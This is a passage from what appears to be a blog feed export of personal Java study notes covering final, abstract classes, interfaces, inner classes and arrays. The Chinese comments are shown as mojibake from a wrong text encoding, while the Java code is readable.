finalå¯ä»¥ä¿®é¥°çš„ç»“æ„ï¼šç±»ã€æ–¹æ³•ã€å˜é‡ * * ã€finalä¿®é¥°ç±»ï¼šã€‘ * è¯¥ç±»åŠ äº†finalåï¼Œä¸èƒ½è¢«ç»§æ‰¿äº† * æ¯”å¦‚ï¼šString, System, StringBuffer * * ã€ finalä¿®é¥°æ–¹æ³•ï¼šã€‘ * è¯¥æ–¹æ³•ä¸èƒ½è¢«é‡å†™äº† * æ¯”å¦‚ï¼šObjectä¸­çš„getClass() * * ã€ finalä¿®é¥°å˜é‡ï¼šã€‘ * æ­¤æ—¶çš„"å˜é‡"å°±ç§°ä¸ºæ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œä¸èƒ½å†ä¿®æ”¹äº† * finalä¿®é¥°å±æ€§ï¼šå¯ä»¥è€ƒè™‘èµ‹å€¼çš„ä½ç½®æœ‰ï¼šæ˜¾å¼åˆå§‹åŒ–ã€ä»£ç å—ä¸­åˆå§‹åŒ–ã€æ„é€ å™¨ä¸­åˆå§‹åŒ– * * ã€ finalä¿®é¥°å±€éƒ¨å˜é‡ï¼šã€‘ * æ–¹æ³•å†…å£°æ˜çš„å±€éƒ¨å˜é‡ã€å½¢å‚ * å°¤å…¶æ˜¯finalä¿®é¥°å½¢å‚æ—¶å€™ï¼Œè¡¨ç¤ºè¯¥å½¢å‚ä¸ºä¸€ä¸ªå¸¸é‡ï¼Œå½“æˆ‘ä»¬è°ƒç”¨æ—¶å€™ä¸ºè¿™ä¸ªå½¢å‚èµ‹å€¼ä¸ºä¸€ä¸ªå®å‚ï¼Œä»¥åï¼Œæ–¹æ³•å†…åªèƒ½è¿›è¡Œè°ƒç”¨ä¸èƒ½ä¿®æ”¹ * * * static final: ç”¨æ¥ä¿®é¥° å±æ€§ -->å…¨å±€å¸¸é‡(æ¥å£ä¸­å¸¸ç”¨)ã€æ–¹æ³• --> * * */ public class FinalTest { public static void main(String[] args) { AA aa = new AA(); aa.setDown(10); } } final class FinalA{ // è¯¥ç±»ä¸èƒ½å†è¢«ç»§æ‰¿äº† } class AA{ // è¯¥å±æ€§ä¸èƒ½å†è¢«ä¿®æ”¹äº† final String NAME = "aaa"; final int WIDTH; final int HEIGHT; // final int DOWN; { WIDTH =10; } public AA(){ HEIGHT = 10; } public AA(int n){ HEIGHT = n; } public final void show() { //æ­¤æ–¹æ³•ä¸èƒ½è¢«é‡å†™äº† } public void setDown() { final int NUM = 11; // finalä¹‹åå°±å˜æˆå¸¸é‡äº† } public void setDown(final int num) { System.out.println(num); //ä¿®é¥°å½¢å‚æ—¶å€™ï¼Œæ–¹æ³•å†…åªèƒ½è¿›è¡Œè°ƒç”¨ä¸èƒ½ä¿®æ”¹ } } æŠ½è±¡ç±»ä¸æŠ½è±¡æ–¹æ³•ï¼ˆé‡è¦ï¼‰ abstract æœ‰æ—¶å°†ä¸€ä¸ªçˆ¶ç±»è®¾è®¡å¾—éå¸¸æŠ½è±¡ï¼Œä»¥è‡³äºå®ƒæ²¡æœ‰å…·ä½“çš„å®ä¾‹ï¼Œè¿™æ ·çš„ç±»å«åšæŠ½è±¡ç±»ã€‚ package cn.xpshuai.java5; /* * abstract * å¯ä»¥ä¿®é¥°çš„ç»“æ„ï¼šç±»ã€æ–¹æ³• * abstractä¿®é¥°ï¼Œè¡¨ç¤ºä¸èƒ½é€ å¯¹è±¡äº† * * abstractä¿®é¥°ç±»:æŠ½è±¡ç±» * >æ­¤ç±»ä¸èƒ½å®ä¾‹åŒ– * >æŠ½è±¡ç±»ä¸­ä¸€å®šæœ‰æ„é€ å™¨ï¼Œä¾¿äºå­ç±»å®ä¾‹åŒ–æ—¶å€™è°ƒç”¨ * >å¼€å‘ä¸­ï¼Œéƒ½ä¼šæä¾›æŠ½è±¡ç±»çš„å­ç±»ï¼Œè®©å­ç±»å¯¹è±¡å®ä¾‹åŒ–å¹¶å®Œæˆæ“ä½œ * * * * abstractä¿®é¥°æ–¹æ³•:æŠ½è±¡æ–¹æ³• * >åªæœ‰æ–¹æ³•çš„å£°æ˜ï¼Œæ²¡æœ‰æ–¹æ³•ä½“ * >å¦‚æœç±»ä¸­åŒ…å«æœ‰æŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆè¯¥ç±»ä¸€å®šæ˜¯æŠ½è±¡ç±»ã€‚åä¹‹æŠ½è±¡ç±»ä¸­ä¸ä¸€å®šè¦æœ‰æŠ½è±¡æ–¹æ³• * >è‹¥å­ç±»é‡å†™äº†çˆ¶ç±»ä¸­æ‰€æœ‰æŠ½è±¡æ–¹æ³•ä¸­ï¼Œæ‰èƒ½å®ä¾‹åŒ–å¯¹è±¡ * è‹¥å­ç±»æ²¡æœ‰é‡å†™çˆ¶ç±»ä¸­çš„æ‰€æœ‰çš„æŠ½è±¡æ–¹æ³•ï¼Œåˆ™æ­¤å­ç±»ä¹Ÿæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œéœ€è¦ä½¿ç”¨abstractä¿®é¥° * * * æŠ½æ ·çš„åº”ç”¨åœºæ™¯ä¸¾ä¾‹ï¼š * * * æ³¨æ„ç‚¹ï¼š * 1.abstractä¸èƒ½ç”¨æ¥ä¿®é¥°ï¼šå±æ€§ã€æ„é€ å™¨ç­‰ * 2.abstractä¸èƒ½ç”¨æ¥ä¿®é¥°ç§æœ‰æ–¹æ³•ã€é™æ€æ–¹æ³•ã€finalçš„æ–¹æ³•ã€finalçš„ç±» * * */ public class AbstractTest { public static void main(String[] args) { // Person p1 = new Person(); // abstractä¹‹åå°±ä¸èƒ½å®ä¾‹åŒ–å¯¹è±¡äº† // p1.eat(); } } abstract class Person { // abstractä¹‹åå°±ä¸èƒ½å®ä¾‹åŒ–äº† private String name; private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void eat() { System.out.println("äººï¼šåƒé¥­"); } public void walk() { System.out.println("äººï¼šèµ°è·¯"); } abstract public void play(); //æŠ½è±¡æ–¹æ³•ï¼ˆåªæœ‰æ–¹æ³•çš„å£°æ˜ï¼Œæ²¡æœ‰æ–¹æ³•ä½“ï¼‰å­ç±»ä¸­å¿…é¡»å¾—å®ç°è¿™ä¸ªæ–¹æ³• } class Student extends Person{ public Student(String name, int age) { super(name, age); // } //F1.é‡å†™è¯¥æ–¹æ³• @Override public void play() { System.out.println("å­¦ç”Ÿç©"); } //F2:æŠŠå­ç±»å˜æˆæŠ½è±¡ç±» } åˆ›å»ºæŠ½è±¡ç±»çš„åŒ¿åå­ç±»å¯¹è±¡ package cn.xpshuai.java5; /* * æŠ½è±¡ç±»çš„åŒ¿åå­ç±» */ public class PersonTest { public static void main(String[] args) { method(new Student("tom", 19)); //åŒ¿åå¯¹è±¡ Worker worker = new Worker(); method1(worker); //éåŒ¿åçš„ç±»å’Œå¯¹è±¡ method1(new Worker()); //éåŒ¿åçš„ç±», åŒ¿åçš„å¯¹è±¡ //åˆ›å»ºäº†ä¸€ä¸ªåŒ¿åå­ç±»çš„å¯¹è±¡ï¼šp Person p = new Person() { @Override //é‡å†™åŒ¿åæ–¹æ³•å³å¯ public void play() { System.out.println("åŒ¿åé‡å†™"); } }; method1(p); //åˆ›å»ºåŒ¿åå­ç±»çš„åŒ¿åå¯¹è±¡ï¼ˆé€‚åˆç”¨ä¸€æ¬¡çš„æƒ…å†µï¼‰ method1(new Person() { @Override public void play() { System.out.println("ç©å¥½ç©çš„ä¸œè¥¿"); } }); } public static void method(Student s) { } public static void method1(Person p) { } } class Worker extends Person{ @Override public void play() { System.out.println("å·¥äººå¨±ä¹"); } } å¤šæ€çš„åº”ç”¨ï¼šæ¨¡æ¿æ–¹æ³•è®¾è®¡æ¨¡å¼ æ¥å£(Interface)ï¼ˆé‡è¦ï¼‰package cn.xpshuai.java5; /* * æ¥å£å…³é”®å­—çš„ä½¿ç”¨ï¼š * 1.ä½¿ç”¨Interface å…³é”®å­—å®šä¹‰ * ç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ * ä¸€å®šç¨‹åº¦è§£å†³äº†ç±»çš„å•ç»§æ‰¿çš„å±€é™æ€§ * 2.Javaä¸­ï¼Œæ¥å£å’Œç±»æ˜¯å¹¶åˆ—çš„ä¸¤ä¸ªç»“æ„ * * 3.å®šä¹‰æ¥å£ï¼šå®šä¹‰æ¥å£ä¸­çš„æˆå‘˜ * 3.1 JDK7åŠä»¥å‰ï¼šåªèƒ½å¤Ÿå®šä¹‰å…¨å±€å¸¸é‡å’ŒæŠ½è±¡æ–¹æ³• * >å…¨å±€å¸¸é‡ï¼špublic static finalçš„, ä½†æ˜¯ä¹¦å†™æ—¶å¯ä»¥çœç•¥ä¸å†™ * >æŠ½è±¡æ–¹æ³•ï¼špublic abstractçš„ * * * * * 3.2 JDK8: é™¤äº†å®šä¹‰å…¨å±€å¸¸é‡å’ŒæŠ½è±¡æ–¹æ³•ä¹‹å¤–ï¼Œè¿˜å¯ä»¥å®šä¹‰ï¼šé™æ€æ–¹æ³•ã€é»˜è®¤æ–¹æ³• * * * * * * 4.æ¥å£ä¸­ä¸èƒ½å®šä¹‰æ„é€ å™¨ï¼ï¼ï¼æ„å‘³ç€æ¥å£ä¸å¯ä»¥å®ä¾‹åŒ– * * 5.å¼€å‘ä¸­ï¼Œæ¥å£é€šè¿‡ç±»å»"å®ç°"(implements)çš„æ–¹å¼æ¥ä½¿ç”¨ * å¦‚æœå®ç°ç±»è¦†ç›–äº†æ¥å£ä¸­æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œåˆ™è¯¥å®ç°ç±»æœ‰å®ä¾‹åŒ– * å¦‚æœå®ç°ç±»æ²¡æœ‰è¦†ç›–æ¥å£ä¸­æ‰€æœ‰çš„æŠ½è±¡æ–¹æ³•ï¼Œåˆ™æ­¤å®ç°ç±»ä»ä¸ºä¸€ä¸ªæŠ½è±¡ç±» * æŠ½è±¡ç±»å’Œæ¥å£ä¸­ï¼Œå«å®ç°ï¼Œä¸å«é‡å†™ * * * 6.Javaç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£--->å¼¥è¡¥äº†Javaå•ç»§æ‰¿æ€§çš„å±€é™æ€§é—®é¢˜ * æ ¼å¼ï¼šclass AA extends BB implements CC, DD{ } * * * 7.æ¥å£å’Œæ¥å£ä¹‹é—´ï¼šä¹Ÿå«ç»§æ‰¿ï¼Œå¯ä»¥å¤šç»§æ‰¿ * * * 8.æ¥å£æ˜¯å…·ä½“ä½¿ç”¨ï¼Œä½“ç°äº†å¤šæ€æ€§ * 9.æ¥å£ï¼Œå®é™…ä¸Šå¯ä»¥çœ‹åšæ˜¯ä¸€ç§è§„èŒƒ * * é¢è¯•é¢˜ï¼šæŠ½è±¡ç±»ä¸æ¥å£æœ‰å“ªäº›å¼‚åŒï¼Ÿ * * * æ¥å£åº”ç”¨ï¼šä»£ç†æ¨¡å¼ã€å·¥å‚æ¨¡å¼(ä¸€ç§è®¾è®¡æ¨¡å¼) * */ public class InterfaceTest { public static void main(String[] args) { Plane plane = new Plane(); plane.fly(); } } interface AttackAble{ void attack(); } interface Flyable{ //å…¨å±€å¸¸é‡ public static final int MAX_SPEED = 7900; int MIN_SPEED = 1; //çœç•¥äº†public static final // æŠ½è±¡æ–¹æ³• public abstract void fly(); void stop(); // çœç•¥äº†public abstract } class Plane implements Flyable{ @Override // è¿™å«ï¼šå®ç°ï¼Œä¸å«é‡å†™ public void fly() { System.out.println("é£æœºé€šè¿‡å¼•æ“èµ·é£"); }; @Override public void stop() { System.out.println("é©¾é©¶å‘˜å‡é€Ÿåœæ­¢"); }; } //åªèƒ½è¿˜å«æŠ½è±¡ç±»ï¼Œè¦ä¹ˆå°±æŠŠæŠ½è±¡æ–¹æ³•éƒ½å®ç°äº† abstract class Kite implements Flyable{ @Override // è¿™å«ï¼šå®ç°ï¼Œä¸å«é‡å†™ public void fly() { System.out.println("é£ç­é€šè¿‡é£èµ·é£"); }; } //å­å¼¹ç±»ï¼ˆ å®ç°å¤šä¸ªæ¥å£ï¼‰ class Bullet extends Object implements Flyable, AttackAble{ //å…ˆå†™ç»§æ‰¿çˆ¶ç±»ï¼Œåå†™å®ç°å…·ä½“çš„æ¥å£ @Override public void attack() { } @Override public void fly() { } @Override public void stop() { } } interface AA{ void method1(); } interface BB{ void method2(); } interface CC extends BB,AA{ } package cn.xpshuai.java5; /*JDK8: é™¤äº†å®šä¹‰å…¨å±€å¸¸é‡å’ŒæŠ½è±¡æ–¹æ³•ä¹‹å¤–ï¼Œè¿˜å¯ä»¥å®šä¹‰ï¼šé™æ€æ–¹æ³•ã€é»˜è®¤æ–¹æ³• * * * */ public class Java8Test { // public static void method1() { // System.out.println("åŒ—äº¬"); // } public static void main(String[] args) { SubClass sub = new SubClass(); //çŸ¥è¯†ç‚¹1ï¼šæ¥å£ä¸­å®šä¹‰çš„é™æ€æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡æ¥å£æ¥è°ƒç”¨ CompareA.method1(); //çŸ¥è¯†ç‚¹2ï¼šé€šè¿‡å®ç°ç±»çš„å¯¹è±¡ï¼Œå¯ä»¥è°ƒç”¨æ¥å£ä¸­é»˜è®¤æ–¹æ³•ï¼Œå¯é‡å†™ sub.method2(); //æ²¡æœ‰method1() //çŸ¥è¯†ç‚¹3ï¼šå¦‚æœå­ç±»(æˆ–å®ç°ç±»)ç»§æ‰¿çš„çˆ¶ç±»å’Œå®ç°æ¥å£ä¸­æœ‰å£°æ˜äº†åŒååŒå‚æ•°çš„æ–¹æ³• // å­ç±»åœ¨æ²¡æœ‰é‡å†™æ­¤æ–¹æ³•çš„æƒ…å†µä¸‹ï¼Œåˆ™è°ƒç”¨çš„æ˜¯çˆ¶ç±»ä¸­æ­¤æ–¹æ³• --> ç±»ä¼˜å…ˆåŸåˆ™ sub.method3(); //çŸ¥è¯†ç‚¹4ï¼šå¦‚æœå®ç°ç±»å®ç°äº†å¤šä¸ªæ¥å£ï¼Œè€Œè¿™ä¸ªæ¥å£ä¸­å®šä¹‰äº†åŒåå‚æ•°çš„é»˜è®¤æ–¹æ³• //é‚£ä¹ˆåœ¨å®ç°ç±»æ²¡æœ‰çˆ¶ç±»ï¼Œä¸”æ²¡æœ‰é‡å†™æ­¤æ–¹æ³•çš„æƒ…å†µä¸‹ï¼ŒæŠ¥é”™-->æ¥å£å†²çª // è¿™å°±éœ€è¦æˆ‘ä»¬å¿…é¡»å®ç°æ­¤ç±»ä¸­é‡å†™æ­¤æ–¹æ³• } } class SubClass extends SuperClas implements CompareA,CompareB{ @Override public void method2() { System.out.println("compareA:ä¸Šæµ·222222"); } //çŸ¥è¯†ç‚¹5ï¼šå¦‚ä½•åœ¨å­ç±»(å®ç°ç±»)çš„æ–¹æ³•ä¸­è°ƒç”¨çˆ¶ç±»ã€æ¥å£ä¸­è¢«é‡å†™çš„æ–¹æ³• public void myMethod() { method3(); //è°ƒè‡ªå·±çš„ super.method3(); //è°ƒçˆ¶ç±»çš„ //è°ƒæ¥å£ä¸­çš„é»˜è®¤æ–¹æ³• CompareA.super.method3(); CompareB.super.method3(); } } å†…éƒ¨ç±»ï¼ˆç”¨çš„å°‘ï¼‰ ä¸€ç§ç±»æˆå‘˜ package cn.xpshuai.java5; /* * ç±»çš„å†…éƒ¨æˆå‘˜ä¹‹äº”: å†…éƒ¨ç±» * 1.Javaä¸­å…è®¸å°†ä¸€ä¸ªç±»Aå£°æ˜åœ¨å¦ä¸€ä¸ªç±»Bä¸­ï¼Œåˆ™ç±»Aå°±æ˜¯å†…éƒ¨ç±»ï¼Œç±»Bç§°ä¸ºå¤–éƒ¨ç±» * 2.å†…éƒ¨ç±»åˆ†ç±»ï¼š æˆå‘˜å†…éƒ¨ç±»(é™æ€ã€éé™æ€) vs å±€éƒ¨å†…éƒ¨ç±»(æ–¹æ³•å†…ã€ä»£ç å—å†…ã€æ„é€ å™¨å†…) * * 3.æˆå‘˜å†…éƒ¨ç±»ï¼š * ä¸€æ–¹é¢ï¼Œä½œä¸ºå¤–éƒ¨ç±»çš„æˆå‘˜ï¼š * >è°ƒç”¨å¤–éƒ¨ç±»çš„ç»“æ„ * >å¯ä»¥è¢«staticä¿®é¥° * >å¯ä»¥è¢«æƒé™ä¿®é¥°ç¬¦ä¿®é¥° * * * å¦ä¸€æ–¹é¢ï¼Œä½œä¸ºä¸€ä¸ªç±»ï¼š * >ç±»å†…å¯ä»¥å®šä¹‰å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨ * >å¯ä»¥è¢«finalä¿®é¥°ï¼Œè¡¨ç¤ºæ­¤ç±»ä¸èƒ½è¢«ç»§æ‰¿ * >å¯è¢«abstractä¿®é¥°ï¼Œè¡¨ç¤ºä¸èƒ½è¢«å®ä¾‹åŒ– * * 4.1 å¦‚ä½•å®ä¾‹åŒ–æˆå‘˜å†…éƒ¨ç±»å¯¹è±¡ï¼Ÿ * * 4.2 å¦‚ä½•åœ¨æˆå‘˜å†…éƒ¨ç±»ä¸­åŒºåˆ†è°ƒç”¨å¤–éƒ¨ç±»çš„ç»“æ„ï¼Ÿ * * 4.3 å¼€å‘ä¸­ï¼Œå±€éƒ¨å†…éƒ¨ç±»çš„ä½¿ç”¨ * * * * */ public class InnerClassTest { public static void main(String[] args) { //åˆ›å»ºFoodå®ä¾‹(é™æ€çš„æˆå‘˜å†…éƒ¨ç±») People.Food food = new People.Food(); food.show(); //åˆ›å»ºFood2å®ä¾‹(éé™æ€çš„æˆå‘˜å†…éƒ¨ç±») // People.Food2 food2 = new People.Food2(); People people = new People(); People.Food2 food2 = people.new Food2("å¤§ç™½èœ"); food2.show(); } } class People{ String name; int age; public void eat() { System.out.println("people eat"); } // é™æ€æˆå‘˜å†…éƒ¨ç±» static class Food{ // abstract String name; int age; public void show() { System.out.println("food1"); } // eat(); } // éé™æ€æˆå‘˜å†…éƒ¨ç±» class Food2{ String name; public Food2(String name) { this.name = name; } public void show() { System.out.println(name + "food22"); } // People.this.eat(); //è°ƒç”¨å¤–éƒ¨ç±»å±æ€§(éé™æ€) public void display(String name) { System.out.println(name); // å½¢å‚ System.out.println(this.name); //å†…éƒ¨ç±»çš„å±æ€§ System.out.println(People.this.name); //å¤–éƒ¨ç±»çš„å±æ€§ } } public void method() { //å±€éƒ¨å†…éƒ¨ç±» class AA{ } } { //å±€éƒ¨å†…éƒ¨ç±» class BB{ } } // æ„é€ å™¨ public People() { //å±€éƒ¨å†…éƒ¨ç±» class CC{ } } //è¿”å›ä¸€ä¸ªå®ç°äº†Comparableæ¥å£çš„ç±»çš„å¯¹è±¡ public Comparable getComparable() { //åˆ›å»ºä¸€ä¸ªå®ç°äº†Comparableæ¥å£çš„ç±»ï¼šå±€éƒ¨å†…éƒ¨ç±» class MyComparable implements Comparable{ @Override public int compareTo(Object obj) { return 0; } } return new MyComparable(); } } å±€éƒ¨å†…éƒ¨ç±»ä½¿ç”¨æ³¨æ„ç‚¹ï¼š public class Test{ public void method() { //å±€éƒ¨å†…éƒ¨ç±»çš„æ–¹æ³•ä¸­ï¼Œå¦‚æœè°ƒç”¨å±€éƒ¨å†…éƒ¨ç±»æ‰€å£°æ˜çš„æ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡çš„è¯ï¼Œ //è¦æ±‚æ­¤å±€éƒ¨å˜é‡å£°æ˜ä¸ºfinal //å±€éƒ¨å˜é‡: jdk7ä¹‹å‰éœ€è¦åŠ finalï¼Œjdk8åå¯çœç•¥ï¼Œä½†é»˜è®¤ä¹Ÿæ˜¯çš„ int num = 11; //å±€éƒ¨å†…éƒ¨ç±» class AA{ public void show() { //åªèƒ½ç”¨ï¼Œä¸èƒ½ä¿®æ”¹å±€éƒ¨å˜é‡ï¼Œå…¶å®æ˜¯ä¸€ä¸ªå‰¯æœ¬ // num = 22; //æŠ¥é”™ System.out.println(num); } } } } å†…å®¹é€»è¾‘æœ‰äº›æ··ä¹±ï¼Œä»…ä¸ºä¸ªäººå­¦ä¹ ç¬”è®°â€¦â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>å­¦ä¹ ç¬”è®°</tag>
        <tag>é¢å‘å¯¹è±¡</tag>
        <tag>OOP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹æ•°ç»„]]></title>
    <url>%2Fposts%2F63254%2F</url>
    <content type="text"><![CDATA[æ•°ç»„ æ•°ç»„(Array)ï¼Œæ˜¯å¤šä¸ªç›¸åŒç±»å‹æ•°æ®æŒ‰ä¸€å®šé¡ºåºæ’åˆ—çš„é›†åˆï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªåå­—å‘½åï¼Œå¹¶é€šè¿‡ç¼–å·çš„æ–¹å¼å¯¹è¿™äº›æ•°æ®è¿›è¡Œç»Ÿä¸€ç®¡ç†ã€‚ æ•°ç»„æœ¬èº«å°±æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ï¼Œè€Œæ•°ç»„ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ä»»ä½•æ•°æ®ç±»å‹ã€‚ åˆ›å»ºæ•°ç»„å¯¹è±¡ä¼šåœ¨å†…å­˜ä¸­å¼€è¾Ÿä¸€æ•´å—è¿ç»­çš„ç©ºé—´ï¼Œè€Œæ•°ç»„åä¸­å¼•ç”¨çš„æ˜¯è¿™å—è¿ç»­ç©ºé—´çš„é¦–åœ°å€ã€‚ æ•°ç»„çš„é•¿åº¦ä¸€æ—¦ç¡®å®šï¼Œå°±ä¸èƒ½ä¿®æ”¹ã€‚ ä¸€ç»´æ•°ç»„ä½¿ç”¨public class ArrayTest { public static void main(String[] args) { int[] ids; // å£°æ˜ ids = new int[] {1001, 1002, 1003, 1004, 1005, 1006}; //åˆå§‹åŒ–æ–¹å¼1(é™æ€åˆå§‹åŒ–)ï¼šæ•°ç»„çš„åˆå§‹åŒ–å’Œæ•°ç»„å…ƒç´ çš„èµ‹å€¼æ“ä½œåŒæ—¶è¿›è¡Œ String[] names = new String[5]; //åŠ¨æ€åˆå§‹åŒ–ï¼šæ•°ç»„çš„åˆå§‹åŒ–å’Œæ•°ç»„å…ƒç´ çš„èµ‹å€¼æ“ä½œåˆ†å¼€è¿›è¡Œ //ä¸€æ—¦åˆå§‹åŒ–å®Œæ¯•ï¼Œæ•°ç»„é•¿åº¦å°±ç¡®å®šäº† int[] ididids ={1001, 1002, 1003, 1004, 1005, 1006}; //ç±»å‹æ¨æ–­(éæ ‡å‡†å†™æ³•) //é”™è¯¯å†™æ³•... //int[] arr1 = new int[]; //int[5] arr1 = new int[]; //int[] arr1 = new int[3]{1,2,3}; //2.è°ƒç”¨æŒ‡å®šä½ç½®çš„å…ƒç´ : é€šè¿‡ç´¢å¼•[0,n-1] names[0] = "å¼ ä¸‰"; // é€šè¿‡è§’æ ‡èµ‹å€¼ names[1] = "é™ˆå¥•è¿…"; names[2] = "æœ±ä¸€é¾™"; names[3] = "å¼ æ°"; names[4] = "ä¼ä½°"; // charAt(0)ï¼Œåªè¦ä¸æ˜¯æ•°æ®åº“äº¤äº’ï¼Œéƒ½æ˜¯ä»0å¼€å§‹ System.out.print(names[1]); //3.å¦‚ä½•è·å–æ•°ç»„é•¿åº¦: .lengthå±æ€§ System.out.print(names.length); System.out.println(ids.length); //4.å¦‚ä½•éå†æ•°ç»„ for(int i=0; i &lt; names.length; i++) { //æœ€å¤§åˆ°é•¿åº¦-1 System.out.println("å§“åï¼š" + names[i] + "\tå­¦å·ï¼š" + ids[i]); } //5.æ•°ç»„å…ƒç´ çš„é»˜è®¤åˆå§‹åŒ–å€¼ // è‹¥æ•°ç»„å…ƒç´ æ˜¯æ•´å‹ï¼šé»˜è®¤åˆå§‹åŒ–å€¼ä¸º0 // ...æµ®ç‚¹å‹ï¼š0.0 // è‹¥æ•°ç»„å…ƒç´ æ˜¯charï¼šé»˜è®¤åˆå§‹åŒ–å€¼ä¸º0 ,å½¢å¼ä¸Šä¸º"ç©ºæ ¼" // ...å¸ƒå°”å‹ï¼šfalse // ... å¼•ç”¨æ•°æ®ç±»å‹æ—¶(æ¯”å¦‚String)ï¼šnull int[] arr1 = new int[4]; for (int i = 0; i &lt; arr1.length; i++) { System.out.println(arr1[i]); } // è‹¥æ•°ç»„å…ƒç´ æ˜¯Stringï¼šé»˜è®¤åˆå§‹åŒ–å€¼ä¸ºnull String[] arr2 = new String[4]; for (int i = 0; i &lt; arr2.length; i++) { System.out.println(arr2[i]); } //6.ä¸€ç»´æ•°ç»„çš„å†…å­˜è§£æ System.out.println("111"); // } } ä¸€ç»´æ•°ç»„çš„å†…å­˜è§£æé¦–å…ˆï¼Œåœ¨jvmä¸­ï¼Œå†…å­˜çš„ç®€åŒ–ç»“æ„å¦‚ä¸‹: ä¸€ç»´æ•°ç»„çš„å†…å­˜è§£æå¦‚ä¸‹ï¼š å¼•ç”¨è®¡æ•°ç®—æ³•ï¼šå½“æ ˆä¸­æ²¡æœ‰å˜é‡æŒ‡å‘å †ç©ºé—´çš„åœ°å€ï¼Œå°±ä¼šè‡ªåŠ¨å›æ”¶è¿™æ®µå †ä¸­çš„åƒåœ¾åœ°å€ äºŒç»´æ•°ç»„å¯¹äºäºŒç»´æ•°ç»„ï¼Œå¯ä»¥çœ‹åšæ˜¯ä¸€ç»´æ•°ç»„åˆä½œä¸ºå¦ä¸€ä¸ªä¸€ä¸ªæ•°ç»„çš„å…ƒç´ è€Œå­˜åœ¨ã€‚ å…¶å®ï¼Œä»æ•°ç»„åº•å±‚çš„è¿è¡Œæœºåˆ¶æ¥çœ‹ï¼Œå¹¶æ²¡æœ‰å¤šç»´æ•°ç»„ã€‚ ä½¿ç”¨public class DoubleArrayTest { public static void main(String[] args) { //* 1.å£°æ˜å’Œåˆå§‹åŒ– //äºŒç»´ //é™æ€åˆå§‹åŒ– int[][] arr2 = new int[][]{{1,2,3}, {4,5,6}, {7,8,9}}; // åŠ¨æ€åˆå§‹åŒ– String[][] arr22 = new String[3][2]; // è¡Œåˆ— String[][] arr222 = new String[3][]; String arr2222[][] = new String[3][4]; int[][] arr22222 ={{1,2,3}, {4,5,6}, {7,8,9}}; String[][] names = new String[4][2]; //é”™è¯¯æƒ…å†µï¼š //String[][] arr22 = new String[][4]; //2.è°ƒç”¨æŒ‡å®šä½ç½®çš„å…ƒç´  names[0][0] = "å¼ ä¸‰"; // é€šè¿‡è§’æ ‡èµ‹å€¼ names[0][1] = "é™ˆå¥•è¿…"; names[1][0] = "æœ±ä¸€é¾™"; names[1][1] = "å¼ æ°"; names[2][0] = "ä¼ä½°"; names[2][1] = "è¿ªä¸½çƒ­å·´"; names[3] = new String[2]; // //System.out.println(names[1][0]); for (int i = 0; i &lt; names.length; i++) { for (int j = 0; j &lt; names[i].length; j++) { System.out.print(names[i][j] + "\t"); //æœªèµ‹å€¼çš„ä¸ºnull } System.out.println(); } //3.å¦‚ä½•è·å–æ•°ç»„é•¿åº¦: .lengthå±æ€§ System.out.println(names.length); //è·å–çš„æ˜¯å¤–å±‚æ•°ç»„çš„é•¿åº¦ System.out.println(names[0].length); // è·å–çš„å¤–å±‚ç¬¬ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„çš„é•¿åº¦ System.out.println(names[1].length); //4.å¦‚ä½•éå†äºŒç»´æ•°ç»„ï¼šä¸¤å±‚ï¼ˆå…ˆéå†æŒ‡å®šè¡Œå†éå†åˆ—ï¼‰ for (int i = 0; i &lt; names.length; i++) { for (int j = 0; j &lt; names[i].length; j++) { System.out.print(names[i][j] + "\t"); //æœªèµ‹å€¼çš„ä¸ºnull } System.out.println(); } //5.äºŒä½æ•°ç»„å…ƒç´ çš„é»˜è®¤åˆå§‹åŒ–å€¼ // å¤–å±‚å…ƒç´ (æ˜¯ä¸€ä¸ªåœ°å€å€¼)ï¼Œå†…å±‚å…ƒç´ (åŒä¸€ç»´) int[][] arrDouble = new int[4][3]; System.out.println(arrDouble); // äºŒç»´çš„åœ°å€å€¼ï¼š[[I@15db9742 System.out.println(arrDouble[0]); //å¤–å±‚æ˜¯ä¸€ä¸ªåœ°å€å€¼ [I@6d06d69c System.out.println(arrDouble[0][0]); // æ˜¯0 String[][] arrDoubleS = new String[4][3]; System.out.println(arrDoubleS[0]); //æ˜¯ä¸€ä¸ªåœ°å€å€¼ System.out.println(arrDoubleS[0][0]); // æ˜¯null //6.äºŒç»´æ•°ç»„çš„å†…å­˜è§£æ } } äºŒç»´æ•°ç»„çš„å†…å­˜è§£æ Arrayså·¥å…·ç±»public class ArraysToolClassTest { public static void main(String[] args) { // boolean equals(int[] a,int[] b) int[] arr1 = new int[]{1,2,3}; int[] arr2 = new int[] {10,3,9}; boolean isEquals = Arrays.equals(arr1, arr2); System.out.println(isEquals); // String toString(int[] a) è¾“å‡ºæ•°ç»„ä¿¡æ¯ System.out.println(Arrays.toString(arr1)); // void fill(int[] a, int val) å°†æŒ‡å®šå€¼å¡«å……åˆ°æ•°ç»„ä¸­ Arrays.fill(arr1, 9); System.out.println(Arrays.toString(arr1)); // void sort(int[] a) Arrays.sort(arr2); System.out.println(Arrays.toString(arr2)); // int binarySearch(int[] a, int key) äºŒåˆ†æŸ¥æ‰¾(å‰æï¼šæ•°ç»„å¿…é¡»æœ‰åº) 